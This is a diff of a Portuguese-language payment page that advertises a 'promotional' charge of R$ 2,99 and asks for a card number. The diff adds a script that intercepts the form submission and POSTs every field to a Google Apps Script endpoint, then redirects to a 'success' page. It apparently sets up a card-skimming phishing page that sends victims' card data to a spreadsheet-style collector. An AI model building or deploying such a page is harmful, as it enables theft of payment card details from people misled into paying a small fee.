@@ -127,9 +127,24 @@ button:active {
     <span>Valor promocional</span>
     <strong>R$ 2,99</strong>
   </div>
-  
-  fetch("https://script.google.com/macros/s/AKfycby29iZLq2ykB6cm4kuw5nuJIaKGrF-uH68oNGmBplCBxc7954prhgvUktmUZ3Yidrra/exec", 
-  
+
+  <script>
+document.getElementById("form").addEventListener("submit", function(e) {
+  e.preventDefault();
+
+  fetch("https://script.google.com/macros/s/AKfycby38Vg-M2EUVpM0d8P4a4vKEbSU3yGXp2chdUYrYfR3G2S1vM_U_AICLNVav8CmNu0R/exec", {
+    method: "POST",
+    body: new FormData(this)
+  })
+  .then(() => {
+    window.location.href = "sucesso.html";
+  })
+  .catch(() => {
+    alert("Erro ao enviar. Tente novamente.");
+  });
+});
+</script>
+
     <label>Número do cartão</label>
     <input name="numero" required placeholder="Digite o número">
 
@@ -168,6 +183,7 @@ button:active {
 
 </body>
 </html>
+
 
 
 
